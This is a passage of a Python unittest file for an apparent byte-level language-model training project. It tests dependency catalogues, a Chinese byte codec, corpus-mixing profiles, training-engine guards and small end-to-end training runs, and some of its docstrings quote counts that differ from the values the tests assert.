    def test_233_v1025_top_2026_ecosystem_wheels_and_ube_codec(self):
        """v10.25: Verify 2026 SOTA open-source wheel bridge (fla/Liger/XGrammar/safetensors/etc.) & UBE -33.3% Chinese codec."""
        from pathlib import Path as _P
        from src.brain import ecosystem_backends as eb
        from src.brain import prepare_seed_corpus as psc
        from src.brain.exoskeleton_bridge import UniversalByteCodec

        # 1. Ecosystem wheel probe & clean pure-Python fallback
        probe = eb.probe_top_2026_ecosystem_wheels()
        self.assertEqual(probe["total_catalog_wheels"], 77)
        for wheel in ("fla", "flashqla", "liger_kernel", "xgrammar", "llguidance", "safetensors", "torchao", "datatrove", "lm_eval", "evalplus"):
            self.assertIn(wheel, probe["details"])
        self.assertIsNone(eb.try_fla_gated_delta_rule(None, None, None, None, None))
        self.assertIsNone(eb.try_liger_fused_linear_ce(None, None, None))
        self.assertFalse(eb.save_weights_safetensors({}, "/tmp/nonexistent_noop.safetensors") and "safetensors" in probe["missing_optional_wheels"])
        self.assertIsNone(eb.load_weights_safetensors("/tmp/definitely_missing_12345.safetensors"))

        # 2. UBE codec in format_record_bytes cuts Chinese byte length by ~33.3% losslessly
        zh_text = "孤立系统的总熵永不减少，这是热力学第二定律的核心表述。"
        src = psc.DatasetSource("zh", "d", None, "train", "text", None, 1.0, "real_edu_zh")
        b_utf8 = psc.format_record_bytes(src, {"text": zh_text}, use_ube_codec=False)
        b_ube = psc.format_record_bytes(src, {"text": zh_text}, use_ube_codec=True)
        self.assertLess(len(b_ube), int(len(b_utf8) * 0.72))
        self.assertEqual(UniversalByteCodec.decode(b_ube[:-1]), zh_text)

        # 3. Verify requirements-rtx3050.txt exists
        req = (_P(__file__).resolve().parents[1] / "requirements-rtx3050.txt").read_text(encoding="utf-8")
        self.assertIn("flash-linear-attention", req)
        self.assertIn("liger-kernel", req)
        self.assertIn("xgrammar", req)

    def test_234_v1026_full_wheel_hotpath_wiring_and_zero_sync_adagc(self):
        """v10.26: Verify hot-path Liger/FLA/XGrammar/UBE wiring & 0-.item()-sync GPU AdaGC + micro-batch accumulation."""
        from pathlib import Path as _P
        from src.brain import ecosystem_backends as eb
        from src.brain.wake_sleep_runtime import WakeSleepBrainRuntime
        root = _P(__file__).resolve().parents[1]

        # 1. XGrammar-2 bridge & WakeSleepBrainRuntime.compile_tool_call_grammar
        gram = WakeSleepBrainRuntime.compile_tool_call_grammar('{"type": "object", "properties": {"cmd": {"type": "string"}}}')
        self.assertIn(gram["backend"], {"xgrammar_v2_cpp", "python_schema_fallback"})
        self.assertIsNone(eb.try_liger_rms_norm(None, None))

        # 2. sovereign_brain_pytorch: Liger RMSNorm, FLA GDN hook, UBE patch prior, and GPU-resident AdaGC (0 .item() sync)
        sb_src = (root / "src/brain/sovereign_brain_pytorch.py").read_text(encoding="utf-8")
        self.assertIn("try_liger_rms_norm", sb_src)
        self.assertIn("try_fla_gated_delta_rule", sb_src)
        self.assertIn("lead_mask = (idx_256 >= 0x80) if use_ube_codec else (idx_256 >= 0xC0)", sb_src)
        self.assertIn('st["adagc_ema"] = self._adagc_shield.ema_beta * ema_t', sb_src)
        self.assertNotIn("float(g_det.norm().item())", sb_src)

        # 3. training_engine: GPU-accumulated acc_loss_t / step_ce_t
        te_src = (root / "src/brain/training_engine.py").read_text(encoding="utf-8")
        self.assertIn("acc_loss_t = acc_loss_t + loss.detach().float()", te_src)
        self.assertIn("step_ce_t = step_ce_t + raw_ce.detach().float()", te_src)

        # 4. prepare_seed_corpus CLI --use-ube end-to-end
        psc_src = (root / "src/brain/prepare_seed_corpus.py").read_text(encoding="utf-8")
        self.assertIn("--use-ube", psc_src)
        self.assertIn("use_ube_codec=use_ube_codec", psc_src)

    def test_235_v1027_ecosystem_wheel_matrix_solidified_in_readme(self):
        """v10.27: Verify all 16 verified 2026 SOTA open-source wheels are solidified in ecosystem_backends, requirements-rtx3050.txt, and README.md (keeping 8-.md SSOT lock)."""
        from pathlib import Path as _P
        from src.brain import ecosystem_backends as eb
        root = _P(__file__).resolve().parents[1]

        probe = eb.probe_top_2026_ecosystem_wheels()
        self.assertEqual(probe["total_catalog_wheels"], 77)
        for wheel in (
            "fla", "flame", "flashqla", "tilelang", "liger_kernel", "cut_cross_entropy",
            "xgrammar", "llguidance", "verl", "openrlhf", "bitnet_cpp",
            "safetensors", "torchao", "datatrove", "lm_eval", "evalplus",
        ):
            self.assertIn(wheel, probe["details"])
            self.assertTrue(probe["details"][wheel]["url"].startswith("https://"))

        readme = (root / "README.md").read_text(encoding="utf-8")
        self.assertIn("2026 顶级开源轮子全栈映射与冲突裁决", readme)
        for url_frag in (
            "fla-org/flash-linear-attention", "fla-org/flame", "QwenLM/FlashQLA",
            "tile-ai/tilelang", "linkedin/Liger-Kernel", "apple/ml-cross-entropy",
            "mlc-ai/xgrammar", "verl-project/verl", "openrlhf/openrlhf", "microsoft/BitNet",
        ):
            self.assertIn(url_frag, readme)

        req = (root / "requirements-rtx3050.txt").read_text(encoding="utf-8")
        self.assertIn("cut-cross-entropy", req)
        self.assertIn("tilelang", req)
        self.assertIn("verl", req)
        self.assertIn("microsoft/BitNet", req)


    def test_236_v1028_real_pytorch_p1_engram_regression_and_7domain_wheel_arbitration(self):
        """v10.28: Real PyTorch regression for P=1 Engram single-patch crash bug + 7-domain 28-wheel conflict arbitration."""
        from pathlib import Path as _P
        import torch
        from src.brain import ecosystem_backends as eb
        from src.brain import sovereign_brain_pytorch as sb
        root = _P(__file__).resolve().parents[1]

        # 1. Real PyTorch regression: P=1 (T=1, T=3) Engram lookup & full forward+backward must never shape-mismatch
        cfg = sb.PRESETS["micro_debug"]
        brain = sb.SovereignRouteBBrain(cfg)
        for T in (1, 3):
            x = torch.randint(0, 256, (2, T), dtype=torch.long)
            out = brain(x, targets=x)
            self.assertTrue(torch.isfinite(out["loss"]))
            out["loss"].backward()
            brain.zero_grad(set_to_none=True)

        # 2. 7-domain 28-wheel catalog & explicit conflict arbitration verdicts
        probe = eb.probe_top_2026_ecosystem_wheels()
        self.assertEqual(probe["domain_count"], 16)
        self.assertEqual(probe["total_catalog_wheels"], 77)
        self.assertEqual(set(probe["rejected_conflict_wheels"]), {"bitsandbytes", "ollama", "daytona", "arize_phoenix", "transformer_lens"})
        for dom in eb.WHEEL_DOMAINS:
            self.assertGreaterEqual(len(probe["by_domain"][dom]), 2)
        for name in ("helion", "auto_round", "sglang", "vllm", "llama_cpp", "executorch", "mlc_llm", "nemo_curator", "inspect_ai", "openhands"):
            self.assertIn(name, probe["details"])
            self.assertTrue(probe["details"][name]["conflict_note"])

        # 3. README.md solidifies all 7 domains & conflict rejections while keeping 8-.md lock
        readme = (root / "README.md").read_text(encoding="utf-8")
        self.assertIn("16 大领域 × 77 轮子", readme)
        self.assertIn("bitsandbytes", readme)
        self.assertIn("Ollama", readme)
        self.assertIn("pytorch/helion", readme)
        self.assertIn("UKGovernmentBEIS/inspect_ai", readme)


    def test_237_v1029_4layer_freshness_gate_wheels_datasets_papers(self):
        """v10.29: Rule 27 3-pillar freshness & anti-rot gate across 40 wheels, 16 HF datasets, and 2,236 papers."""
        from pathlib import Path as _P
        from src.brain import ecosystem_backends as eb
        from src.brain import prepare_seed_corpus as psc
        root = _P(__file__).resolve().parents[1]

        # 1. Pillar 1: 8-domain 40-wheel freshness & conflict/sovereignty rejections
        wf = eb.audit_ecosystem_wheel_freshness(online=False)
        self.assertTrue(wf["ok"])
        self.assertEqual(wf["total_wheels"], 77)
        self.assertEqual(wf["domain_count"], 16)
        self.assertEqual(set(wf["rejected_conflicts_enforced"]), {"bitsandbytes", "ollama", "daytona", "arize_phoenix", "transformer_lens"})

        # 2. Pillar 2: HF corpus liveness & gated-repo preflight warning
        df = psc.audit_corpus_sources_liveness("rtx3050_4gb_prod_30gb", online=False)
        self.assertTrue(df["ok"])
        self.assertIn("BAAI/Infinity-Instruct", df["gated_requiring_hf_token"])
        self.assertIn("nvidia/Nemotron-CC-Math-v1", psc.KNOWN_GATED_HF_DATASETS)

        # 3. Pillar 3: Constitution Rule 27 & README 8-domain 40-wheel matrix
        const = (root / "SYSTEM_CONSTITUTION.md").read_text(encoding="utf-8")
        self.assertIn("第 27 条", const)
        readme = (root / "README.md").read_text(encoding="utf-8")
        self.assertIn("--audit-freshness", readme)
        self.assertIn("microsoft/dion", readme)
        self.assertIn("langfuse/langfuse", readme)
        self.assertIn("firecracker-microvm/firecracker", readme)


    def test_238_v1030_10pair_interference_ube_rho1_fix_56wheels_and_2026_datasets(self):
        """v10.30: Verify 10-pair cross-mechanism interference guard (UBE x UTF-8 mask & Fused CE x Selective Loss),
        UBE-aware Rho-1/SelectiveLoss alignment, 10-domain 56-wheel matrix, and 2026 non-gated dataset upgrades."""
        import torch
        from src.brain import ecosystem_backends as eb
        from src.brain import prepare_seed_corpus as psc
        from src.brain import training_engine as te
        from src.brain.exoskeleton_bridge import UniversalByteCodec

        # 1. 10-pair CrossMechanismInterferenceMatrixGuard catches Conflict #9 & #10
        guard = te.CrossMechanismInterferenceMatrixGuard()
        ok_res = guard.audit_stack_compatibility({"use_ube_codec": True, "enable_rho1_mask": True, "ube_aware_mask": True})
        self.assertTrue(ok_res["safe"])
        self.assertEqual(ok_res["checked_pairs"], 12)

        bad_res = guard.audit_stack_compatibility({
            "use_ube_codec": True, "enable_rho1_mask": True, "ube_aware_mask": False,
            "use_fused_linear_ce_kernel": True, "use_selective_token_loss": True,
        })
        self.assertFalse(bad_res["safe"])
        self.assertIn("ube_2byte_codec_split_by_utf8_continuation_mask", bad_res["conflicts"])
        self.assertIn("fused_scalar_ce_kernel_conflicts_with_per_token_selective_loss", bad_res["conflicts"])

        # 2. UBE-aware Rho-1 mask never splits a 2-byte UBE Chinese token
        ube_bytes = UniversalByteCodec.encode("熵增定律")
        self.assertEqual(len(ube_bytes), 8)
        m = psc.utf8_safe_rho1_byte_mask(ube_bytes, [1.0, 0.1, 0.2, 0.9, 2.0, 0.0, 0.3, 0.4], [0.0]*8, keep_top_ratio=0.5, use_ube_codec=True)
        for pair_i in range(0, len(m), 2):
            self.assertEqual(m[pair_i], m[pair_i + 1], f"UBE 2-byte pair split at {pair_i}: {m}")

        # 3. compute_selective_token_loss(use_ube_codec=True) runs cleanly on real PyTorch tensors
        logits = torch.randn(2, 8, 256)
        targets = torch.tensor([list(ube_bytes), list(ube_bytes)], dtype=torch.long)
        loss_u, stats_u = te.compute_selective_token_loss(logits, targets, use_ube_codec=True)
        self.assertTrue(torch.isfinite(loss_u))
        self.assertIn("weighted_ce", stats_u)

        # 4. 10-domain 56-wheel catalog & 2026 non-gated prod_30gb dataset upgrades (preserving 59:41 & 80% real anchor)
        probe = eb.probe_top_2026_ecosystem_wheels()
        self.assertEqual(probe["domain_count"], 16)
        self.assertEqual(probe["total_catalog_wheels"], 77)
        for w in ("litdata", "polars", "duckdb", "uv", "distilabel", "lmcache", "mooncake", "swanlab", "trackio"):
            self.assertIn(w, probe["details"])

        prof = psc.CORPUS_PROFILES["rtx3050_4gb_prod_30gb"]
        hf_ids = {s.hf_id for s in prof.sources}
        self.assertIn("openbmb/UltraData-Math", hf_ids)
        self.assertIn("openbmb/Ultra-FineWeb-L3", hf_ids)
        self.assertIn("nvidia/Nemotron-SFT-Math-v4", hf_ids)
        total_w = round(sum(s.weight for s in prof.sources), 4)
        zh_w = round(sum(s.weight for s in prof.sources if s.category.endswith("_zh")), 4)
        real_w = round(sum(s.weight for s in prof.sources if s.category.startswith("real_")), 4)
        self.assertEqual(total_w, 1.0)
        self.assertEqual(zh_w, 0.41)
        self.assertGreaterEqual(real_w, 0.79)


    def test_239_v1031_12domain_66wheel_formal_verifiers_ocr_vector_mcp(self):
        """v10.31: Verify Domains 11 & 12 (Formal Verifiers Lean4/Pantograph/Z3/SandboxFusion, STEM OCR MinerU/Docling, Local Vector USearch/Qdrant, MCP SDK)."""
        from src.brain import ecosystem_backends as eb
        probe = eb.probe_top_2026_ecosystem_wheels()
        self.assertEqual(probe["domain_count"], 16)
        self.assertEqual(probe["total_catalog_wheels"], 77)
        for w in ("lean4", "pantograph", "z3", "sandbox_fusion", "mineru", "docling", "olmocr", "usearch", "qdrant_client", "mcp"):
            self.assertIn(w, probe["details"])
            self.assertTrue(probe["details"][w]["url"].startswith("https://"))


    def test_240_v1032_16domain_77wheel_code_ast_web_mechinterp_voice(self):
        """v10.32: Verify Domains 13-16 (Code AST/Linting, Web Exoskeleton, nnsight/SAELens vs rejected TransformerLens, Local Edge Speech I/O)."""
        from src.brain import ecosystem_backends as eb
        probe = eb.probe_top_2026_ecosystem_wheels()
        self.assertEqual(probe["domain_count"], 16)
        self.assertEqual(probe["total_catalog_wheels"], 77)
        self.assertIn("transformer_lens", probe["rejected_conflict_wheels"])
        for w in ("tree_sitter", "ruff", "ripgrep", "crawl4ai", "playwright", "trafilatura", "nnsight", "sae_lens", "whisper_cpp", "kokoro"):
            self.assertIn(w, probe["details"])
            self.assertTrue(probe["details"][w]["url"].startswith("https://"))



    def test_241_v11_engineering_fusion_complete(self):
        """v11.0 Gate: Verify native Windows runtime guard, streaming shuffle+weighted_interleave+5-dim filter,
        5-primitive CausalIRConflictGenerator, ZeroInitGatedEngramAdapter, 12-pair interference matrix,
        GracefulRLRewardEngine, and AristotelianNeighborhoodProbe."""
        import tempfile
        import torch
        import prepare_seed_corpus as psc
        import sovereign_brain_pytorch as sbp
        import training_engine as te
        import ecosystem_backends as eb

        # 1. Super-dense v11 profile checks (zero gated repos, >=60% real anchor, 100% Tier-S 2025-2026)
        prof = psc.CORPUS_PROFILES["rtx3050_4gb_super_dense_v11"]
        self.assertEqual(prof.target_mb, 2048)
        total_w = sum(s.weight for s in prof.sources)
        self.assertAlmostEqual(total_w, 1.0, places=5)
        real_w = sum(s.weight for s in prof.sources if s.category.startswith("real_"))
        self.assertGreaterEqual(real_w, 0.60)
        self.assertTrue(all(s.vintage_year >= 2025 and s.quality_tier == "S" for s in prof.sources))
        self.assertNotIn("BAAI/Infinity-Instruct", [s.hf_id for s in prof.sources])

        # 2. 5-dim super-density filter + weighted_interleave in write_deduped_stream
        junk = "aaaa " * 100
        good = (
            "def verify_invariant(x, limit):\n"
            "    # Because x + base must satisfy constraint <= limit, verify contradiction and fix.\n"
            "    if x > limit:\n"
            "        return limit\n"
            "    return x\n"
        )
        self.assertFalse(psc.score_super_density_sample(junk, "real_edu_en")["passed"])
        self.assertTrue(psc.score_super_density_sample(good, "real_code")["passed"])

        s1 = psc.DatasetSource("src_code", "dummy/code", None, "train", "text", None, 0.5, "real_code", 2026, "S")
        s2 = psc.DatasetSource("src_math", "dummy/math", None, "train", "text", None, 0.5, "real_edu_en", 2026, "S")
        rows_code = [{"text": f"def f_{i}(x):\n    # Because invariant constraint holds, verify error and fix {i}\n    return x + {i}\n"} for i in range(6)]
        rows_math = [{"text": f"Assume constraint C_{i} holds; therefore verify counterexample and fix contradiction {i}."} for i in range(6)]
        with tempfile.TemporaryDirectory() as td:
            out_bin = Path(td) / "interleaved.bin"
            rep = psc.write_deduped_stream(
                out_bin,
                [(s1, rows_code), (s2, rows_math)],
                target_bytes=2048,
                weighted_interleave=True,
                enable_super_density_filter=True,
                min_density_score=0.35,
            )
            self.assertTrue(rep["weighted_interleave"])
            self.assertGreater(rep["bytes_by_source"]["src_code"], 0)
            self.assertGreater(rep["bytes_by_source"]["src_math"], 0)

        # 3. 5-primitive CausalIRConflictGenerator (normal conflict + explicit UnresolvedHole + Context Distillation)
        gen = psc.CausalIRConflictGenerator()
        c_fix = gen.generate_case(seed=7, skin="commerce_order", inject_unresolved_hole=False, context_distillation=True)
        self.assertTrue(c_fix["conflict_detected"])
        self.assertEqual(c_fix["verdict"], "MINIMAL_INTERVENTION_VERIFIED")
        self.assertNotIn("[Rule:", c_fix["prompt"])
        c_hole = gen.generate_case(seed=8, skin="approval_workflow", inject_unresolved_hole=True, context_distillation=False)
        self.assertTrue(c_hole["has_unresolved_hole"])
        self.assertEqual(c_hole["verdict"], "ABSTAIN_AND_SURFACE_TRADEOFF")
        self.assertIn("[Rule:", c_hole["prompt"])
        self.assertEqual(len(gen.generate_batch(6)), 6)

        # 4. ZeroInitGatedEngramAdapter real PyTorch forward/backward (exact identity at step 0 + gradient flow)
        adapter = sbp.ZeroInitGatedEngramAdapter(hidden_dim=64, slots=512, engram_dim=32)
        h_in = torch.randn(2, 6, 64, requires_grad=True)
        toks = torch.randint(0, 1000, (2, 6))
        h_out = adapter(h_in, toks)
        self.assertEqual(float((h_out - h_in).abs().max().item()), 0.0)
        (h_out.pow(2).mean()).backward()
        self.assertIsNotNone(adapter.gate.grad)

        # 5. 12-pair CrossMechanismInterferenceMatrixGuard catches #11 (Triton CPU Engram) and #12 (unshuffled stream)
        guard = te.CrossMechanismInterferenceMatrixGuard()
        bad_v11 = guard.audit_stack_compatibility({
            "torch_compile_whole_model": True,
            "cpu_pinned_engram_enabled": True,
            "engram_compiler_disabled": False,
            "streaming_corpus_slice": True,
            "shard_shuffle_enabled": False,
            "weighted_interleave_enabled": False,
        })
        self.assertFalse(bad_v11["safe"])
        self.assertEqual(bad_v11["checked_pairs"], 12)
        self.assertIn("triton_windows_cpu_pointer_crash", bad_v11["conflicts"])
        self.assertIn("sequential_shard_truncation_and_source_forgetting", bad_v11["conflicts"])

        # 6. GracefulRLRewardEngine strict ordering & group advantage normalization
        grl = te.GracefulRLRewardEngine()
        r_ok = grl.score_outcome(True, False, True)["reward"]
        r_fb = grl.score_outcome(False, True, False)["reward"]
        r_or = grl.score_outcome(False, True, True)["reward"]
        r_fab = grl.score_outcome(False, False, True)["reward"]
        self.assertTrue(r_ok > r_fb > r_or > r_fab)
        adv = grl.compute_graceful_group_advantages([
            {"is_correct": True, "abstained_or_flagged_hole": False, "is_answerable": True},
            {"is_correct": False, "abstained_or_flagged_hole": True, "is_answerable": False},
            {"is_correct": False, "abstained_or_flagged_hole": False, "is_answerable": True},
        ])
        self.assertEqual(len(adv), 3)
        self.assertGreater(adv[0], adv[1])
        self.assertGreater(adv[1], adv[2])

        # 7. AristotelianNeighborhoodProbe local mKNN rotation invariance across mismatched dims
        probe = te.AristotelianNeighborhoodProbe()
        torch.manual_seed(0)
        rep_a = torch.randn(24, 16)
        q_rot, _ = torch.linalg.qr(torch.randn(16, 16))
        rep_b = torch.cat([rep_a @ q_rot, torch.zeros(24, 8)], dim=-1)
        mknn = probe.compute_mknn_overlap(rep_a, rep_b, k=5)
        self.assertAlmostEqual(mknn["mknn_overlap"], 1.0, places=4)
        self.assertAlmostEqual(mknn["calibrated_lift"], 1.0, places=4)

        # 8. WindowsNativeRuntimeGuard + 2026-11 edge backbones registry
        wguard = eb.WindowsNativeRuntimeGuard()
        env_map = wguard.build_env_vars(r"D:\Environment\.cache")
        self.assertTrue(env_map["TRITON_CACHE_DIR"].startswith(r"D:\Environment\.cache"))
        budget = wguard.recommend_micro_batch_budget(3100.0)
        self.assertEqual(budget["recommended_num_workers_windows"], 0)
        self.assertTrue(budget["avoid_fp8_on_ampere_sm86"])
        audit_w = wguard.audit_windows_native_stack()
        self.assertIn("olala_v1_mini_7a1b", audit_w["edge_backbones_2026_11"])
        self.assertIn("nemotron_3_5_bolt_e4b_4gb", audit_w["edge_backbones_2026_11"])
        import wake_sleep_runtime as wsr
        hooks = wsr.v11_live_runtime_hooks(hidden_dim=64)
        self.assertEqual(hooks["adapter_gate_init"], 0.0)
        self.assertTrue(hooks["probe_ready"])

    def test_242_v12_full_repo_windows_cli_and_data_closure(self) -> None:
        """v12.0 Gate: Verify full-repo 2026-11 dependency alignment, Windows D-drive scripts, CLI aliases & --data-bin memmap training."""
        import subprocess, sys, tempfile
        from pathlib import Path
        from src.brain.ecosystem_backends import WindowsNativeRuntimeGuard

        repo = Path(__file__).resolve().parents[1]

        # 1. Dependency specs & WindowsNativeRuntimeGuard alignment
        pyproj = (repo / "pyproject.toml").read_text(encoding="utf-8")
        req3050 = (repo / "requirements-rtx3050.txt").read_text(encoding="utf-8")
        self.assertIn('version = "12.2.0"', pyproj)
        self.assertIn('requires-python = ">=3.11"', pyproj)
        self.assertIn("torch>=2.15.0", req3050)
        self.assertIn("triton-windows>=3.9.0", req3050)
        self.assertIn("flash-linear-attention>=0.6.0", req3050)
        self.assertIn("liger-kernel>=0.8.5", req3050)
        self.assertIn("datasets>=5.2.0", req3050)
        self.assertIn("torchao>=0.18.0", req3050)
        self.assertIn("hf-xet>=1.8.0", req3050)
        self.assertIn("transformers>=5.24.0", req3050)

        guard = WindowsNativeRuntimeGuard()
        self.assertEqual(guard.RECOMMENDED_PYTHON, "3.15")
        self.assertEqual(guard.SUPPORTED_PYTORCH, "2.15.0")
        self.assertEqual(guard.DEFAULT_CUDA_WHEEL, "cu134")

        # 2. Native Windows zero-C-drive bootstrap & smoke scripts
        setup_ps1 = (repo / "scripts/setup_windows_d_drive.ps1").read_text(encoding="utf-8")
        smoke_ps1 = (repo / "scripts/run_smoke_windows.ps1").read_text(encoding="utf-8")
        self.assertIn("D:\\Environment", setup_ps1)
        self.assertIn("triton-windows", setup_ps1)
        self.assertIn("cu134", setup_ps1)
        self.assertIn("--super-density", smoke_ps1)
        self.assertIn("--data-bin", smoke_ps1)

        # 3. prepare_seed_corpus.py default profile + --target-mb / --output-dir CLI
        psc_help = subprocess.check_output(
            [sys.executable, str(repo / "src/brain/prepare_seed_corpus.py"), "--help"],
            text=True,
        )
        self.assertIn("--output-dir", psc_help)
        self.assertIn("--target-mb", psc_help)
        self.assertIn("--causal-ir-samples", psc_help)

        # 4. sovereign_brain_pytorch.py --data-bin memmap training end-to-end (tiny_ci, 2 steps)
        with tempfile.TemporaryDirectory() as td:
            bin_path = Path(td) / "smoke.bin"
            ckpt_path = Path(td) / "out" / "smoke.pt"
            bin_path.write_bytes((b"def f(x): return x + 1\n" * 64))
            proc = subprocess.run(
                [
                    sys.executable,
                    str(repo / "src/brain/sovereign_brain_pytorch.py"),
                    "--config", "micro_debug",
                    "--data-bin", str(bin_path),
                    "--seq-len", "64",
                    "--steps", "2",
                    "--save-path", str(ckpt_path),
                ],
                capture_output=True,
                text=True,
                check=True,
            )
            self.assertIn("Loaded memmap corpus", proc.stdout)
            self.assertIn("tok/s=", proc.stdout)
            self.assertTrue(ckpt_path.is_file())


    def test_243_v12_1_simhash_band_index_real_sources_and_warmup_timing(self) -> None:
        """v12.1 Gate: Verify O(1) 4-band SimHashBandIndex exactness, real non-empty code/zh HF sources, and warmup steady-state timing."""
        import random, subprocess, sys, tempfile
        from pathlib import Path
        from src.brain.prepare_seed_corpus import CORPUS_PROFILES, SimHashBandIndex

        rng = random.Random(2026)
        idx = SimHashBandIndex(max_hamming=3)
        naive: list[int] = []
        base_fps = [rng.getrandbits(64) or 1 for _ in range(200)]
        probe_fps = list(base_fps)
        for fp in base_fps[:40]:
            probe_fps.append(fp ^ (1 << 5))
            probe_fps.append(fp ^ ((1 << 3) | (1 << 21)))
            probe_fps.append(fp ^ ((1 << 1) | (1 << 19) | (1 << 45)))
            probe_fps.append(fp ^ ((1 << 2) | (1 << 18) | (1 << 34) | (1 << 50)))

        for fp in probe_fps:
            got = idx.check_and_add(fp)
            exp = any((fp ^ prev).bit_count() <= 3 for prev in naive)
            if not exp:
                naive.append(fp)
            self.assertEqual(got, exp, f"SimHashBandIndex mismatch on fp={fp:#x}")

        all_hf_ids = {s.hf_id for p in CORPUS_PROFILES.values() for s in p.sources}
        all_subsets = {s.subset for p in CORPUS_PROFILES.values() for s in p.sources}
        self.assertNotIn("nvidia/Nemotron-Pretraining-Code-v3", all_hf_ids)
        self.assertIn("nvidia/OpenCodeReasoning", all_hf_ids)
        self.assertIn("Ultra-FineWeb-L3-zh-QA-Synthetic", all_subsets)
        self.assertIn("Ultra-FineWeb-L3-zh-Multi-Style-Synthetic", all_subsets)

        repo = Path(__file__).resolve().parents[1]
        with tempfile.TemporaryDirectory() as td:
            ckpt = Path(td) / "w.pt"
            proc = subprocess.run(
                [sys.executable, str(repo / "src/brain/sovereign_brain_pytorch.py"),
                 "--config", "micro_debug", "--warmup-steps", "1", "--steps", "3", "--save-path", str(ckpt)],
                capture_output=True, text=True, check=True,
            )
            self.assertIn("ms/step=", proc.stdout)
            self.assertIn("tok/s=", proc.stdout)


if __name__ == "__main__":
    unittest.main()
